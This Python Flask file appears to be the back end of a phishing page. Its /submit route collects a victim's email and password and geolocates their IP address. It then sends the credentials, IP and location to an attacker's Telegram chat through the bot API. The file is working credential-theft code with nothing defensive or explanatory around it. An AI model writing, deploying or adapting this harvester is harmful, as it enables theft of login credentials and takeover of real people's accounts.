import os
from flask import Flask, render_template, request, jsonify
from email.mime.text import MIMEText
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    requests.post(url, data=data)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")

    # Get user's IP
    user_ip = request.remote_addr

    # Get approximate location
    try:
        response = requests.get(f"http://ip-api.com/json/{user_ip}")
        geo = response.json()
        location = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
    except:
        location = "Unknown"

    message = f"""
    Email: {email}
    Password: {password}
    IP Address: {user_ip}
    Location: {location}
    """

    send_to_telegram(message)

    return jsonify({"status": "success"})



if __name__ == "__main__":
    app.run(debug=True)